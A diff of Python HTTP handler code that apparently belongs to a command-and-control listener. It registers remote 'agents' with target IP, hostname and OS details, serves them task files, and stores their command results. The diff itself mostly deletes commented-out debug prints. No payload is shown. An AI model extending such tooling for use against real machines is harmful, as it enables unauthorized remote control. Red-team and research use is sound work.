@@ -5,6 +5,7 @@ import cgi
 from uuid import uuid4
 from .agents_helpers import add_agent, write_results
 
+
 def register_agent(self):
     self.send_response(200)
     self.send_header('content-type', 'text/html')
@@ -42,36 +43,16 @@ def register_agent(self):
         # Grab the "task" field that was input by the post request.\
         uuid = uuid4()
         
-        # print(f"uuid type is {type(uuid)}")
-        # uuid = "uuid"
         ip_port = self.client_address
         (tgt_ip, tgt_port) = ip_port
         tgt_hostname = fields.get('hostname')
         tgt_os = fields.get('os type')
         tgt_os_version = fields.get('os version')
-        # print(f"Agent UUID:          {uuid}")
-        # print(f"Target IP Address:   {tgt_ip}")
-        # print(f"Target Hostname:     {tgt_hostname}")
-        # print(f"Target OS:           {tgt_os}")
-        # print(f"Target OS Version:   {tgt_os_version}\n")
+
         new_agent = Agent(self.listener.name, str(uuid), tgt_ip, tgt_hostname[0], tgt_os[0], tgt_os_version[0])
         add_agent(new_agent)
 
-        # self.listener.agents[uuid] = new_agent
-
-        # for key, value in self.listener.agents.items():
-        #     print(f"$$UUID: {key}\n Listener name: {value.listener_name}\n")
-
-        # print(f"$$Agent listener name: {new_agent.listener_name}")
-        
-        # Come back to this later to add to dict ******************************************
-        # tasklist.append(new_task[0])
-
-        # 301 is a redirect status response. This case, we want the user
-        # to be redirected to the tasklist/new page after submitting a task.
         self.send_response(201, f"@{uuid}")
-        # listener.send_header('content-type', 'text/html')
-        # listener.send_header('Location', '/new')
         # Always have to close the header.
         self.end_headers()
 
@@ -115,20 +96,10 @@ def collect_results(self, agent):
         task_id = fields.get('task id')
         task_cmd = fields.get('task cmd')
         task_results = fields.get('task results')
-        # print(f"Task ID:             {task_id}")
-        # print(f"Task Cmd:             {task_cmd}")
-        # print(f"Task Results:        {task_results}")
+
         write_results(task_id[0], task_cmd[0], task_results[0], agent)
 
-        # Come back to this later to add to dict ******************************************
-        # tasklist.append(new_task[0])
-
-        # 301 is a redirect status response. This case, we want the user
-        # to be redirected to the tasklist/new page after submitting a task.
         self.send_response(201)
-        # listener.send_header('content-type', 'text/html')
-        # listener.send_header('Location', '/new')
-        # Always have to close the header.
         self.end_headers()
 
 
@@ -138,7 +109,6 @@ def serve_tasks(self, agent):
     self.send_header('Content-Disposition', 'attachment; filename="tasks.txt"')
     self.end_headers()
 
-    # Make this a relative path.
     with open(agent.tasks_path, 'rb') as file:
         self.wfile.write(file.read())
 
